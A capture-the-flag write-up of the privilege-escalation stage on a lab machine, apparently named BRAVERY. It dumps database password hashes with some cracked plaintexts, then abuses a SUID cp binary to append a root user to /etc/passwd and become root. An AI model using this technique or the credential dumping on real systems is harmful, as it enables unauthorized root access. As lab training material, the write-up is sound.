# Privesc
## Normal run down
```bash
bash-4.2$ ls -al
total 0
drwxr-xr-x.  4 root  root   31 Dec 25  2018 .
dr-xr-xr-x. 18 root  root  254 Apr  3 12:01 ..
drwx------. 14 david david 279 Sep 29  2018 david
drwx------.  3 rick  rick   78 Jul 10  2018 rick

bash-4.2$ find / -uid 1000 -type f 2>/dev/null
/var/spool/mail/david
bash-4.2$ ls -al /var/spool/mail/david
-rw-rw----. 1 david mail 0 Jun 10  2018 /var/spool/mail/david
bash-4.2$ find / -uid 1004 -type f 2>/dev/null
/var/spool/mail/rick
bash-4.2$ ls -al /var/spool/mail/rick
-rw-rw----. 1 rick mail 0 Jul 10  2018 /var/spool/mail/rick
```

## linpeas.sh
1. /var/nfsshare  *(rw,sync,`no_root_squash`)
2. -rwsr-xr-x. 1 root root    152K Apr 11  2018 /usr/bin/`cp`
3. `/local.txt` - *Congratulations on obtaining a user shell. :)*

- And I think of two things:
	1. we have david's credential which can try to do su   -   nope, not working
	2. we have mysql login credential which maybe worth dig up

## mysql enum
### DB bravery
```bash
MariaDB [bravery]> select username,password from cu_users;
+-------------+----------------------------------+
| username    | password                         |
+-------------+----------------------------------+
| admin       | f49b7babc64b6bc99cb429b1dd2f10de |
| genevieve   | 57e5ee542f5d13648c5ab1e73f12140c |	genevieve
| david       | 6ccb05b8892eba2d8d5892278de39d4e |	jokesasidethisisfun
| qiu         | 16e8d1587723a4ddc28ff8117e6ad0e3 |	qiuuuuuuuuuu
| patrick     | 87e6d56ce79af90dbe07d387d3d0579e |	P@ssw0rd25
| qinyi       | 6d8c198696328b20997f26c1b504df24 |
| govindasamy | 5f4dcc3b5aa765d61d8327deb882cf99 |	password
| roland      | ee21d5f27a8401788147f6f6184ddb11 |	roland
+-------------+----------------------------------+
8 rows in set (0.01 sec)
```

### DB mysql
```bash
MariaDB [mysql]> select User,Password from user;
+------+-------------------------------------------+
| User | Password                                  |
+------+-------------------------------------------+
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
| root | *ED02A9E58E125F18C751D6C4E956F460C868F051 |
+------+-------------------------------------------+
3 rows in set (0.00 sec)
```

### DB test - empty set
 
 - This is back and forth stage, since we have the credentials, I go back to the cuppaCMS to test the account, and it's lucky that user genevieve is super admin.
 ![](Pasted%20image%2020210423213413.png)
 - But the CMS has nothing more, tried to su to david account by his credential not working.
 
 ## /usr/bin/cp
 - Well, I know that /usr/bin/cp could be an asset, but I never thought it's that good...
 ```bash
bash-4.2$ cp /etc/passwd /tmp/passwd
bash-4.2$ ls -al /tmp/passwd
-rw-r--r--. 1 root apache 2632 Apr 23 17:49 /tmp/passwd
bash-4.2$ cat /etc/passwd > /tmp/evil
bash-4.2$ perl -le 'print crypt("pwned", "whatever")'
whlU7j.8He1gc
bash-4.2$ echo 'evil:whlU7j.8He1gc:0:0::/root:/bin/bash' >> /tmp/evil
bash-4.2$ tail /tmp/evil
gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
ossec:x:1001:1002::/var/ossec:/sbin/nologin
ossecm:x:1002:1002::/var/ossec:/sbin/nologin
ossecr:x:1003:1002::/var/ossec:/sbin/nologin
rick:x:1004:1004::/home/rick:/bin/bash
evil:whlU7j.8He1gc:0:0::/root:/bin/bash
bash-4.2$ cp /tmp/evil /etc/passwd
bash-4.2$ su evil
Password:
ABRT has detected 1 problem(s). For more info run: abrt-cli list --since 1545797712
[root@bravery shm]# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:httpd_t:s0
[root@bravery shm]# cat /root/proof.txt
Congratulations on rooting BRAVERY. :)
 ```
 
 